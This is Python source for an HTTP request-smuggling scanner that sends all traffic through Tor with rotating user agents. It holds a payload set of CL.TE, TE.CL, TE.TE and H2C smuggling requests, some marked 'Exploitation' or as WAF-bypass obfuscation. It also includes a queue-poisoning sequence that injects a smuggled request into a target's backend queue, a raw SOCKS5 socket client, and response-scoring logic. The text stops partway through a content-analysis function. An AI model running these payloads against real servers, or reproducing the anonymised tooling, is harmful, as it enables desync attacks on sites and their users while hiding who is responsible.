#!/usr/bin/env python3
"""
DESYNC-HTTP SMUGGLING SCANNER
For authorized security research only
"""

import requests
import argparse
import sys
import time
import numpy as np
import socket
import socks
import struct
from colorama import init, Fore, Style, Back
import threading
import hashlib
import json
import ssl
import random
import re
from collections import OrderedDict
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import threading
from collections import deque
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import asyncio
import aiohttp
from dataclasses import dataclass
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from aiohttp_socks import ProxyConnector
import warnings
import contextlib

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ============================================================================
# TOR SESSION CLASS 
# ============================================================================

class EliteTorSession:
    """Tor session with connection pooling and advanced reliability"""
    
    def __init__(self, tor_proxy='127.0.0.1', tor_port=9050, timeout=30, pool_size=3):
        self.tor_proxy = tor_proxy
        self.tor_port = tor_port
        self.timeout = timeout
        self.pool_size = pool_size
        self.sessions = []
        self.session_index = 0
        self.lock = threading.Lock()
        self._init_sessions()
        
    def _init_sessions(self):
        """Initialize session pool with correct Tor-safe configuration"""
        
        for i in range(self.pool_size):
            session = requests.Session()

            # Tor SOCKS proxy (per-session, NOT global)
            proxy = f'socks5h://{self.tor_proxy}:{self.tor_port}'
            session.proxies = {
                'http': proxy,
                'https': proxy
            }

            # Safe headers
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                'Mozilla/5.0 (X11; Linux x86_64)',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
            ]

            session.headers.update({
                'User-Agent': random.choice(user_agents),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'DNT': '1'
            })

            # SSL config
            session.verify = False

            # Proper retry handling
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry

            retry = Retry(
                total=2,
                backoff_factor=0.5,
                status_forcelist=[500, 502, 503, 504],
                allowed_methods=["GET", "POST"]
            )

            adapter = HTTPAdapter(
                max_retries=retry,
                pool_connections=10,
                pool_maxsize=10
            )

            session.mount("http://", adapter)
            session.mount("https://", adapter)

            # Store session
            self.sessions.append(session)
    
    def _request_with_retry(self, session, method, url, **kwargs):
        """Enhanced request with retry logic"""
        if 'timeout' not in kwargs:
            kwargs['timeout'] = self.timeout
        
        max_retries = 2
        for attempt in range(max_retries + 1):
            try:
                response = requests.Session.request(session, method, url, **kwargs)
                return response
            except (requests.exceptions.ConnectionError, 
                   requests.exceptions.Timeout,
                   requests.exceptions.ChunkedEncodingError) as e:
                if attempt == max_retries:
                    raise
                time.sleep(0.5 * (attempt + 1))
                continue
    
    def get_session(self):
        """Round-robin session selection (safe version)"""
        with self.lock:
            session = self.sessions[self.session_index]
            self.session_index = (self.session_index + 1) % self.pool_size
            return session
    
    def test_tor_connection(self):
        """Comprehensive Tor testing"""
        print(f"{Fore.BLUE}[*] Testing Tor connection...")
        
        test_cases = [
            ("http://check.torproject.org/", 
             lambda r: "Congratulations" in r.text, 
             "check.torproject.org"),
            
            ("http://httpbin.org/headers", 
             lambda r: r.status_code == 200 and 'headers' in r.text.lower(),
             "httpbin.org"),
            
            ("http://icanhazip.com", 
             lambda r: r.status_code == 200 and len(r.text.strip().split('.')) == 4,
             "icanhazip.com"),
        ]
        
        successes = 0
        
        for url, validator, name in test_cases:
            try:
                response = self.get_session().get(url, timeout=10)
                
                if validator(response):
                    print(f"{Fore.GREEN}[+] Tor connection verified via {name}")
                    successes += 1
                else:
                    print(f"{Fore.YELLOW}[!] Tor test {name} failed validation")
                    
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Tor test {name} failed: {str(e)[:50]}")
                continue
        
        # Require at least 2 successful tests
        if successes >= 2:
            print(f"{Fore.GREEN}[+] Tor connection established ({successes}/3 tests passed)")
            return True
        else:
            print(f"{Fore.RED}[-] Tor connection failed ({successes}/3 tests passed)")
            return False

    def get_validation_session(self):
        """
        Dedicated session for validation phase.
        Prevents pool/circuit contamination issues.
        """
        session = requests.Session()

        proxy = f'socks5h://{self.tor_proxy}:{self.tor_port}'
        session.proxies = {
            'http': proxy,
            'https': proxy
        }

        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Validation-Engine)',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })

        session.verify = False

        # lightweight retry only (no pooling corruption)
        from requests.adapters import HTTPAdapter

        adapter = HTTPAdapter(max_retries=1, pool_connections=5, pool_maxsize=5)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        return session
        
    def get_tor_ip(self):
        """Get Tor exit IP with multiple fallback services"""
        ip_services = [
            "http://httpbin.org/ip",
            "http://ipinfo.io/ip",
            "http://api.ipify.org",
            "http://icanhazip.com",
            "http://checkip.amazonaws.com"
        ]
        
        for service in ip_services:
            try:
                response = self.get_session().get(service, timeout=5)
                
                # Validate it's actually an IP address, not HTML
                ip_text = response.text.strip()
                
                # Check if response looks like an IP (IPv4 or IPv6)
                import re
                ip_pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
                ipv6_pattern = r'^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$'
                
                if re.match(ip_pattern, ip_text) or re.match(ipv6_pattern, ip_text):
                    return ip_text
                
                # Some services return JSON
                if '{' in ip_text:
                    try:
                        data = response.json()
                        if 'ip' in data:
                            return data['ip']
                        elif 'origin' in data:
                            return data['origin']
                    except:
                        pass
                        
            except Exception:
                continue  # Try next service
        
        return "Unknown (could not determine)"



# ============================================================================
# PORT SWIGGER PAYLOADS
# ============================================================================

class PortSwiggerPayloads:
    """Complete PortSwigger payload collection with all research techniques"""
    
    @staticmethod
    def get_all_payloads():
        """Get all payloads organized by technique and exploitability"""
        all_payloads = []
        
        # ==================== CL.TE PAYLOADS ====================
        cl_te_payloads = [
            {
                'id': 'clte-001',
                'name': 'CL.TE Basic Desync',
                'technique': 'CL.TE',
                'category': 'Detection',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Content-Length', '6'),
                    ('Transfer-Encoding', 'chunked'),
                    ('X-Smuggle-ID', 'clte-basic')
                ]),
                'body': '0\r\n\r\nG',
                'description': 'Basic CL.TE confusion test',
                'expected': '400/501',
                'risk': 'Detection'
            },
            {
                'id': 'clte-002',
                'name': 'CL.TE Smuggled Prefix',
                'technique': 'CL.TE',
                'category': 'Exploitation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Content-Length', '53'),
                    ('Transfer-Encoding', 'chunked'),
                    ('X-Smuggle-ID', 'clte-prefix')
                ]),
                'body': '0\r\n\r\nGET /hopefully404 HTTP/1.1\r\nX-Injected: header\r\n\r\n',
                'description': 'Smuggle complete HTTP request prefix',
                'expected': '200/404',
                'risk': 'High'
            },
            {
                'id': 'clte-003',
                'name': 'CL.TE Chunk Extension',
                'technique': 'CL.TE',
                'category': 'Obfuscation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Content-Length', '8'),
                    ('Transfer-Encoding', 'chunked'),
                    ('X-Smuggle-ID', 'clte-ext')
                ]),
                'body': '0;foo=bar\r\n\r\nG',
                'description': 'Chunk with extension to bypass WAF',
                'expected': '400/200',
                'risk': 'Medium'
            },
            {
                'id': 'clte-004',
                'name': 'CL.TE Empty Chunk',
                'technique': 'CL.TE',
                'category': 'Detection',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Content-Length', '4'),
                    ('Transfer-Encoding', 'chunked'),
                    ('X-Smuggle-ID', 'clte-empty')
                ]),
                'body': '\r\n0\r\n\r\n',
                'description': 'Empty chunk data',
                'expected': '400',
                'risk': 'Detection'
            }
        ]
        
        # ==================== TE.CL PAYLOADS ====================
        te_cl_payloads = [
            {
                'id': 'tecl-001',
                'name': 'TE.CL Basic Desync',
                'technique': 'TE.CL',
                'category': 'Detection',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', 'chunked'),
                    ('Content-Length', '4'),
                    ('X-Smuggle-ID', 'tecl-basic')
                ]),
                'body': '5\r\nGPOST\r\n0\r\n\r\n',
                'description': 'Basic TE.CL with GPOST method confusion',
                'expected': '400/501',
                'risk': 'Detection'
            },
            {
                'id': 'tecl-002',
                'name': 'TE.CL Trailing Space',
                'technique': 'TE.CL',
                'category': 'Obfuscation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', 'chunked '),
                    ('Content-Length', '6'),
                    ('X-Smuggle-ID', 'tecl-space')
                ]),
                'body': '0\r\n\r\nG',
                'description': 'TE header with trailing space',
                'expected': '200/400',
                'risk': 'Medium'
            },
            {
                'id': 'tecl-003',
                'name': 'TE.CL Tab Character',
                'technique': 'TE.CL',
                'category': 'Obfuscation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', 'chunked\t'),
                    ('Content-Length', '4'),
                    ('X-Smuggle-ID', 'tecl-tab')
                ]),
                'body': '0\r\n\r\nG',
                'description': 'TE header with tab character',
                'expected': '200/400',
                'risk': 'Medium'
            },
            {
                'id': 'tecl-004',
                'name': 'TE.CL Line Wrapping',
                'technique': 'TE.CL',
                'category': 'Obfuscation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', 'chunked'),
                    ('Transfer-Encoding', 'identity'),
                    ('Content-Length', '6'),
                    ('X-Smuggle-ID', 'tecl-wrap')
                ]),
                'body': '0\r\n\r\nG',
                'description': 'Multiple TE headers for line wrapping',
                'expected': '200/400',
                'risk': 'High'
            }
        ]
        
        # ==================== TE.TE PAYLOADS ====================
        te_te_payloads = [
            {
                'id': 'tete-001',
                'name': 'TE.TE Case Obfuscation',
                'technique': 'TE.TE',
                'category': 'Obfuscation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', 'chunked'),
                    ('Transfer-encoding', 'identity'),
                    ('X-Smuggle-ID', 'tete-case')
                ]),
                'body': '0\r\n\r\nG',
                'description': 'Different case TE headers',
                'expected': '400/501',
                'risk': 'Medium'
            },
            {
                'id': 'tete-002',
                'name': 'TE.TE Tab Prefix',
                'technique': 'TE.TE',
                'category': 'Obfuscation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', 'chunked\t'),
                    ('Transfer-Encoding', 'identity'),
                    ('X-Smuggle-ID', 'tete-tab')
                ]),
                'body': '0\r\n\r\nG',
                'description': 'TE header with tab prefix',
                'expected': '400/200',
                'risk': 'Medium'
            },
            {
                'id': 'tete-003',
                'name': 'TE.TE Space Prefix',
                'technique': 'TE.TE',
                'category': 'Obfuscation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', ' chunked'),
                    ('Transfer-Encoding', 'identity'),
                    ('X-Smuggle-ID', 'tete-space')
                ]),
                'body': '0\r\n\r\nG',
                'description': 'TE header with leading space',
                'expected': '400/200',
                'risk': 'Medium'
            },
            {
                'id': 'tete-004',
                'name': 'TE.TE Comma Separation',
                'technique': 'TE.TE',
                'category': 'Obfuscation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', 'chunked, identity'),
                    ('X-Smuggle-ID', 'tete-comma')
                ]),
                'body': '0\r\n\r\nG',
                'description': 'Comma-separated TE values',
                'expected': '400/501',
                'risk': 'High'
            }
        ]
        
        # ==================== H2/H2C PAYLOADS ====================
        h2_payloads = [
            {
                'id': 'h2-001',
                'name': 'H2C Upgrade Desync',
                'technique': 'H2C',
                'category': 'Advanced',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Upgrade', 'h2c'),
                    ('HTTP2-Settings', 'AAMAAABkAAQAAP__'),
                    ('Connection', 'Upgrade, HTTP2-Settings'),
                    ('Content-Length', '0'),
                    ('X-Smuggle-ID', 'h2c-upgrade')
                ]),
                'body': '',
                'description': 'HTTP/2 upgrade smuggling attempt',
                'expected': '101/400',
                'risk': 'Advanced'
            }
        ]
        
        # ==================== VALIDATION PAYLOADS ====================
        validation_payloads = [
            {
                'id': 'val-001',
                'name': 'Queue Poisoning Test',
                'technique': 'CL.TE',
                'category': 'Validation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Content-Length', '87'),
                    ('Transfer-Encoding', 'chunked'),
                    ('X-Validation', 'queue-poison')
                ]),
                'body': '0\r\n\r\nGET /validate-poison HTTP/1.1\r\nHost: TARGET_HOST\r\nX-Poisoned: true\r\n\r\n',
                'description': 'Test request queue poisoning',
                'expected': 'Varies',
                'risk': 'Validation'
            },
            {
                'id': 'val-002',
                'name': 'Method Confusion Test',
                'technique': 'TE.CL',
                'category': 'Validation',
                'headers': OrderedDict([
                    ('Host', 'TARGET_HOST'),
                    ('Transfer-Encoding', 'chunked'),
                    ('Content-Length', '6'),
                    ('X-Validation', 'method-confusion')
                ]),
                'body': '5\r\nGPOST\r\n0\r\n\r\n',
                'description': 'Test for GPOST method confusion',
                'expected': '405/400',
                'risk': 'Validation'
            }
        ]
        
        # Combine all payloads
        all_payloads.extend(cl_te_payloads)
        all_payloads.extend(te_cl_payloads)
        all_payloads.extend(te_te_payloads)
        all_payloads.extend(h2_payloads)
        all_payloads.extend(validation_payloads)
        
        return all_payloads
    
    @staticmethod
    def get_technique_groups():
        """Get payloads grouped by technique"""
        all_payloads = PortSwiggerPayloads.get_all_payloads()
        groups = {}
        
        for payload in all_payloads:
            technique = payload['technique']
            if technique not in groups:
                groups[technique] = []
            groups[technique].append(payload)
        
        return groups
    
    @staticmethod
    def get_validation_sequences():
        """Get multi-request validation sequences"""
        timestamp = str(int(time.time()))
        unique_id = hashlib.md5(timestamp.encode()).hexdigest()[:12]
        
        return [
            {
                'name': 'CL.TE Queue Poisoning Chain',
                'technique': 'CL.TE',
                'sequence': [
                    {
                        'method': 'POST',
                        'path': '/',
                        'headers': OrderedDict([
                            ('Host', 'TARGET_HOST'),
                            ('Content-Length', '95'),
                            ('Transfer-Encoding', 'chunked'),
                            ('X-Sequence-ID', unique_id)
                        ]),
                        'body': f'0\\r\\n\\r\\nGET /poison-test-{unique_id} HTTP/1.1\\r\\nHost: TARGET_HOST\\r\\nX-Injected: yes\\r\\n\\r\\n',
                        'description': 'Poison request queue'
                    },
                    {
                        'method': 'GET',
                        'path': f'/poison-test-{unique_id}',
                        'headers': OrderedDict([
                            ('Host', 'TARGET_HOST'),
                            ('X-Check', 'true')
                        ]),
                        'body': '',
                        'description': 'Check if poisoned'
                    }
                ]
            }
        ]

# ============================================================================
# ELITE RAW HTTP CLIENT
# ============================================================================

class EliteRawHTTPClient:
    """Raw HTTP client with full Tor SOCKS5 support"""
    
    def __init__(self, tor_host='127.0.0.1', tor_port=9050):
        self.tor_host = tor_host
        self.tor_port = tor_port
    
    def _socks5_connect(self, sock, host, port):
        """Complete SOCKS5 handshake"""
        # SOCKS5 greeting
        sock.send(b'\x05\x01\x00')
        resp = sock.recv(2)
        if resp != b'\x05\x00':
            raise Exception(f"SOCKS5 auth failed: {resp.hex()}")
        
        # SOCKS5 connect request
        host_bytes = host.encode('utf-8')
        request = b'\x05\x01\x00\x03' + struct.pack('B', len(host_bytes)) + host_bytes + struct.pack('>H', port)
        sock.send(request)
        
        # Read response
        resp = sock.recv(10)
        if len(resp) < 2 or resp[1] != 0x00:
            raise Exception(f"SOCKS5 connect failed: {resp.hex()}")
    
    def send_request(self, host, port, request_data, timeout=15):
        """Send raw HTTP request through Tor with proper framing"""
        sock = None
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connect to Tor
            sock.connect((self.tor_host, self.tor_port))
            
            # SOCKS5 handshake
            self._socks5_connect(sock, host, port)
            
            # Send request with proper termination
            sock.send(request_data.encode('utf-8'))
            
            # Receive response with chunked reading
            response = b''
            sock.settimeout(5)  # Shorter timeout for reading
            
            try:
                while True:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    response += chunk
                    
                    # Check if we have complete response
                    if b'\r\n\r\n' in response and len(response) > 8192:
                        # For large responses, we might stop early
                        break
            except socket.timeout:
                # Expected for some responses
                pass
            
            return response.decode('utf-8', errors='ignore')
            
        except Exception as e:
            raise Exception(f"Raw request failed: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    def build_complete_request(self, method, host, port, path, headers, body, http_version='1.1'):
        """Build complete HTTP request with proper formatting"""
        # Start line
        request = f"{method} {path} HTTP/{http_version}\r\n"
        
        # Add headers
        for key, value in headers.items():
            if key == 'Host':
                request += f"Host: {host}:{port}\r\n"
            else:
                request += f"{key}: {value}\r\n"
        
        # Add body if present
        request += "\r\n"
        if body:
            request += body
        
        return request

# ============================================================================
# SCANNER CORE
# ============================================================================
class EvidenceEngine:
    """
    Centralized evidence scoring system.
    """

    WEIGHTS = {
        "status_anomaly": 1,
        "timing_anomaly": 1,
        "size_anomaly": 1,
        "header_mutation": 2,
        "error_fingerprint": 2,
        "content_reflection": 4,
        "cross_request_effect": 5,
        "endpoint_mutation": 5,
    }

    def __init__(self):
        self.items = []

    def add(self, category, detail):
        self.items.append({
            "category": category,
            "weight": self.WEIGHTS.get(category, 1),
            "detail": detail
        })

    def score(self):
        return sum(i["weight"] for i in self.items)

    def level(self):
        s = self.score()
        if s >= 10:
            return "confirmed"
        if s >= 6:
            return "strong"
        if s >= 3:
            return "indicator"
        return "signal"

class EliteDESYNCScanner:
    def __init__(self, tor_session, verbose=False, delay=1, threads=3, 
                 enable_raw=True, enable_validation=True):
        self.tor = tor_session
        self.verbose = verbose
        self.delay = delay
        self.threads = threads
        self.enable_raw = enable_raw
        self.enable_validation = enable_validation
        self.raw_client = EliteRawHTTPClient()
        
        # Results storage
        self.results = {
            'target': None,
            'scan_id': hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'baselines': {},
            'detections': [],
            'validations': [],
            'confirmed': [],
            'technique_summary': {},
            'risk_assessment': {},
            'recommendations': []
        }
        
        # Detection patterns
        self.detection_patterns = {
            'CL.TE': {
                'indicators': ['200_OK_on_smuggle', '404_reflection', 'fast_response'],
                'time_range': (0.5, 3.0),
                'confidence_factors': ['status_anomaly', 'timing_pattern', 'content_leak']
            },
            'TE.CL': {
                'indicators': ['timeout', '400_with_delay', 'method_confusion'],
                'time_range': (3.0, 30.0),
                'confidence_factors': ['long_delay', 'gpost_reflection', 'connection_reset']
            },
            'TE.TE': {
                'indicators': ['501_unexpected', '200_with_obfuscation', 'header_confusion'],
                'time_range': (1.0, 5.0),
                'confidence_factors': ['header_anomaly', 'server_error', 'size_variation']
            }
        }
        
        self.lock = threading.Lock()
    
    # ==================== LOGGING SYSTEM ====================
    
    def log(self, message, level="INFO", indent=0, details=None):
        """Professional logging with levels and formatting"""
        colors = {
            "DEBUG": Fore.WHITE + Style.DIM,
            "INFO": Fore.BLUE,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "CRITICAL": Fore.RED + Style.BRIGHT + Back.WHITE,
            "TECHNIQUE": Fore.MAGENTA,
            "DETECTION": Fore.CYAN,
            "VALIDATION": Fore.YELLOW + Style.BRIGHT,
            "CONFIRMED": Fore.RED + Style.BRIGHT
        }
        
        prefixes = {
            "DEBUG": "[DBG]",
            "INFO": "[*]",
            "SUCCESS": "[+]",
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!!!]",
            "TECHNIQUE": "[TECH]",
            "DETECTION": "[DET]",
            "VALIDATION": "[VAL]",
            "CONFIRMED": "[VULN]"
        }
        
        color = colors.get(level, Fore.WHITE)
        prefix = prefixes.get(level, "[*]")
        
        # Format message
        indent_str = "  " * indent
        output = f"{color}{indent_str}{prefix} {message}"
        
        if details and self.verbose:
            output += f"\n{Fore.WHITE}{indent_str}    Details: {details}"
        
        # Print based on level and verbosity
        if level in ["CONFIRMED", "CRITICAL", "ERROR"] or self.verbose or level not in ["DEBUG"]:
            print(output)
        
        return output
    
    # ==================== BASELINE ESTABLISHMENT ====================
    
    def establish_comprehensive_baseline(self, target_url):
        """Establish complete baseline with multiple request types"""
        self.log(f"Establishing comprehensive baseline", "INFO", 0)
        
        parsed = urlparse(target_url)
        base_path = parsed.path or '/'
        
        # Test different endpoints if available
        test_endpoints = [
            {'path': base_path, 'method': 'GET', 'data': None},
            {'path': base_path, 'method': 'POST', 'data': 'test=baseline'},
            {'path': base_path, 'method': 'HEAD', 'data': None},
            {'path': '/robots.txt', 'method': 'GET', 'data': None},
            {'path': '/favicon.ico', 'method': 'GET', 'data': None}
        ]
        
        baselines = {}
        
        for test in test_endpoints:
            full_url = f"{parsed.scheme}://{parsed.netloc}{test['path']}"
            
            try:
                session = self.tor.get_session()
                
                if test['method'] == 'GET':
                    response = session.get(full_url, timeout=15)
                elif test['method'] == 'POST':
                    response = session.post(full_url, data=test['data'], timeout=15)
                elif test['method'] == 'HEAD':
                    response = session.head(full_url, timeout=15)
                else:
                    continue
                
                baseline_key = f"{test['method']}:{test['path']}"
                baselines[baseline_key] = {
                    'url': full_url,
                    'method': test['method'],
                    'path': test['path'],
                    'status': response.status_code,
                    'time': response.elapsed.total_seconds(),
                    'size': len(response.content) if hasattr(response, 'content') else 0,
                    'headers': dict(response.headers),
                    'server': response.headers.get('Server', 'Unknown'),
                    'connection': response.headers.get('Connection', 'keep-alive'),
                    'content_type': response.headers.get('Content-Type', ''),
                    'date': response.headers.get('Date', '')
                }
                
                self.log(f"Baseline {test['method']} {test['path']}: "
                        f"Status={response.status_code}, "
                        f"Time={response.elapsed.total_seconds():.2f}s, "
                        f"Size={baselines[baseline_key]['size']} bytes", 
                        "DETAIL", 1)
                
                if self.delay > 0:
                    time.sleep(self.delay)
                    
            except Exception as e:
                self.log(f"Baseline {test['method']} {test['path']} failed: {str(e)[:50]}", 
                        "WARNING", 1)
                continue
        
        return baselines
    
    # ==================== PAYLOAD TESTING ENGINE ====================
    
    def test_payload_with_analysis(self, target_url, payload, baselines):
        """Test single payload"""
        parsed = urlparse(target_url)
        
        # Get appropriate baseline
        baseline_key = f"POST:{parsed.path or '/'}"
        baseline = baselines.get(baseline_key, {})
        
        # Prepare request with target host
        headers = payload['headers'].copy()
        for key in headers:
            if headers[key] == 'TARGET_HOST':
                headers[key] = parsed.netloc
        
        # Add tracking headers
        test_id = f"test-{payload['id']}-{int(time.time())}"
        headers['X-Test-ID'] = test_id
        headers['X-Scanner'] = 'DESYNC-SCAN-v1.0'
        
        result = {
            'payload_id': payload['id'],
            'name': payload['name'],
            'technique': payload['technique'],
            'category': payload['category'],
            'description': payload['description'],
            'expected': payload['expected'],
            'risk': payload['risk'],
            'test_id': test_id,
            'timestamp': time.time()
        }
        
        try:
            self.log(f"Testing: {payload['name']} ({payload['technique']})", 
                    "TECHNIQUE", 1, payload['description'])
            
            # Send request
            start_time = time.time()
            session = self.tor.get_session()
            response = session.post(
                target_url,
                headers=headers,
                data=payload['body'],
                timeout=25,
                allow_redirects=False,
                verify=False
            )
            response_time = time.time() - start_time
            
            # Complete analysis
            analysis = self._analyze_response_complete(
                response, response_time, payload, baseline
            )
            
            result.update({
                'status': response.status_code,
                'time': response_time,
                'size': len(response.content),
                'response_headers': dict(response.headers),
                'analysis': analysis,
                'error': None
            })
            
            # Log findings
            if analysis['confidence'] in ['high', 'confirmed']:
                self.log(f"{payload['technique']} DETECTED: {payload['name']}", 
                        "DETECTION", 2, 
                        f"Status: {response.status_code}, Confidence: {analysis['confidence']}")
                
                for indicator in analysis['key_indicators'][:3]:
                    self.log(f"Indicator: {indicator}", "DETAIL", 3)
            
            elif self.verbose:
                self.log(f"No detection: {payload['name']} -> {response.status_code}", 
                        "DEBUG", 2)
            
        except requests.exceptions.Timeout:
            result.update({
                'status': 'timeout',
                'time': 30,
                'size': 0,
                'analysis': {
                    'confidence': 'medium',
                    'key_indicators': ['Request timeout (>25s)'],
                    'technique_match': 'TE.CL' if payload['technique'] in ['TE.CL', 'TE.TE'] else 'Unknown',
                    'notes': 'Timeout suggests possible TE.CL vulnerability'
                },
                'error': 'timeout'
            })
            self.log(f"TIMEOUT: {payload['name']} - Possible TE.CL", "WARNING", 2)
            
        except Exception as e:
            result.update({
                'status': 'error',
                'time': 0,
                'size': 0,
                'analysis': {
                    'confidence': 'low',
                    'key_indicators': [f'Request error: {str(e)[:50]}'],
                    'technique_match': 'Unknown',
                    'notes': 'Request failed'
                },
                'error': str(e)
            })
            self.log(f"ERROR: {payload['name']} - {str(e)[:50]}", "ERROR", 2)
        
        return result
    
    # ==================== COMPLETE RESPONSE ANALYSIS ====================
    
    def _analyze_response_complete(self, response, response_time, payload, baseline):
        """Complete PortSwigger-style response analysis"""
        analysis = {
            'confidence': 'low',
            'key_indicators': [],
            'technique_match': None,
            'portswigger_indicators': [],
            'anomaly_score': 0,
            'notes': ''
        }
        
        # Get baseline metrics
        baseline_time = baseline.get('time', 1.0)
        baseline_status = baseline.get('status', 200)
        baseline_size = baseline.get('size', 1000)
        
        # ========== STATUS CODE ANALYSIS ==========
        status_indicators = self._analyze_status_code(
            response.status_code, payload, baseline_status
        )
        analysis['key_indicators'].extend(status_indicators)
        
        # ========== TIMING ANALYSIS ==========
        timing_indicators = self._analyze_timing(
            response_time, baseline_time, payload['technique']
        )
        analysis['key_indicators'].extend(timing_indicators)
        
        # ========== CONTENT ANALYSIS ==========
        content_indicators = self._analyze_content(
            response.text, response.headers, payload
        )
        analysis['key_indicators'].extend(content_indicators)
        
        # ========== HEADER ANALYSIS ==========
        header_indicators = self._analyze_headers(
            response.headers, baseline.get('headers', {})
        )
        analysis['key_indicators'].extend(header_indicators)
        
        # ========== SIZE ANALYSIS ==========
        size_indicators = self._analyze_size(
            len(response.content), baseline_size, response.status_code
        )
        analysis['key_indicators'].extend(size_indicators)
        
        # ========== CONNECTION ANALYSIS ==========
        connection_indicators = self._analyze_connection(
            response.headers, response.elapsed.total_seconds()
        )
        analysis['key_indicators'].extend(connection_indicators)
        
        # ========== TECHNIQUE SPECIFIC ANALYSIS ==========
        technique_indicators = self._analyze_for_technique(
            response, payload['technique'], payload
        )
        analysis['key_indicators'].extend(technique_indicators)
        analysis['technique_match'] = self._determine_technique_match(
            analysis['key_indicators'], payload['technique']
        )
        
        # ========== CONFIDENCE CALCULATION ==========
        analysis['confidence'] = self._calculate_confidence(
            analysis['key_indicators'], 
            response.status_code,
            payload['technique']
        )
        
        # Calculate anomaly score (0-100)
        analysis['anomaly_score'] = min(len(analysis['key_indicators']) * 15, 100)
        
        # PortSwigger specific indicators
        analysis['portswigger_indicators'] = self._get_portswigger_indicators(
            response, payload, analysis['key_indicators']
        )
        
        return analysis
    
    def _analyze_status_code(self, status, payload, baseline_status):
        indicators = []
        technique = payload.get("technique", "")
        name = payload.get("name", "").lower()

        # ================= NORMAL BEHAVIOR FILTER =================
        if technique in ["CL.TE", "TE.CL"] and status in [400, 501]:
            return indicators

        if technique == "TE.TE" and status == 501:
            return indicators

        # ================= REAL SIGNALS ONLY =================
        if status == 200 and any(x in name for x in ["smuggle", "desync"]):
            indicators.append("200_on_smuggling_test")

        if baseline_status is not None:
            if baseline_status != status:
                indicators.append(f"status_change_{baseline_status}_to_{status}")

        if technique == "H2C" and status == 101:
            indicators.append("h2c_upgrade_success")

        if technique == "H2C" and status == 200:
            indicators.append("h2c_unexpected_200")

        return indicators
    
    def _get_expected_status_for_payload(self, payload):
        """Determine expected status codes for this payload type"""

        technique = payload['technique']
        
        # PortSwigger expected behaviors:
        expected_map = {
            'CL.TE': [400, 501],      # Should reject with error
            'TE.CL': [400, 501],      # Should reject with error  
            'TE.TE': [501],           # Should say "not implemented"
            'H2C': [400, 101],        # Should reject OR upgrade
            'validation': [200, 404, 400],  # Depends on test
        }
        
        # Check payload-specific expectations
        if 'expected' in payload:
            expected_str = str(payload['expected'])
            if '200' in expected_str:
                return [200]
            elif '404' in expected_str:
                return [404]
            elif '400' in expected_str:
                return [400]
            elif '501' in expected_str:
                return [501]
        
        return expected_map.get(technique, [])

    def _analyze_timing(self, response_time, baseline_times, technique):
        indicators = []

        if not baseline_times:
            return indicators

        mean = np.mean(baseline_times)
        std = np.std(baseline_times) or 1

        z = (response_time - mean) / std

        if z > 3:
            indicators.append("timing_outlier")

        if technique == "TE.CL" and z > 2.5:
            indicators.append("tecl_delay_pattern")

        return indicators
    
    def _analyze_content(self, content, headers, payload):
        """Content analysis for backend leaks"""
        indicators = []
        content_lower = content.lower()
        
        # Backend server leaks
        servers = ['apache', 'nginx', 'iis', 'lighttpd', 'caddy', 'cloudflare', 'fastly']
        for server in servers:
            if server in content_lower:
                indicators.append(f"backend_leak_{server}")
        
        # Error messages
        errors = [
            'bad request', 'invalid request', 'unsupported transfer encoding',
            'premature end', 'malformed', 'invalid chunk', 'connection reset',
            'request timeout', 'gpost', 'unsupported method'
        ]
        for error in errors:
            if error in content_lower:
                indicators.append(f"error_message_{error.replace(' ', '_')}")
        
        # Smuggled content reflection
        if 'hopefully404' in content:
            indicators.append("smuggled_content_reflection")
        
        if 'gpost' in content_lower and 'TE.CL' in payload['technique']:
            indicators.append("GPOST_reflection_TE.CL")
        
        # Content type anomalies
